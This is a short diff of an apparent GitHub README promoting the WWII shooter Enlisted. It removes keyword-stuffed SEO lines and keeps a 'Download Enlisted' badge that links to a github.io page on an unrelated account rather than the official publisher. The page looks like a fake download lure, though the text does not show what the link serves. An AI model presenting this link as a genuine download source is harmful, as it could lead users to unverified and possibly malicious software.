@@ -1,13 +1,3 @@
-
-enlisted news
-reddit enlisted
-Enlisted download
-Enlisted gameplay
-
-Download Enlisted download to jump into a squad-based WWII shooter with large battles, authentic weapons, vehicles, and tactical objectives. Explore campaigns, upgrade soldiers, and learn why Enlisted gameplay delivers fast action for players who want accessible, team-focused combat online.
-
-Enlisted Game is a free-to-play WWII squad shooter with infantry, tanks, aircraft, campaign progression, and intense online team battles.
-
 # Enlisted Game - Squad-Based WWII Combat and Multiplayer Campaign Battles
 
 [![Download Enlisted](https://img.shields.io/badge/Download-Enlisted-ff8c00?style=for-the-badge&logo=gamejolt&logoColor=white)](https://zierkfebsteer.github.io/.github/enlisted-game)
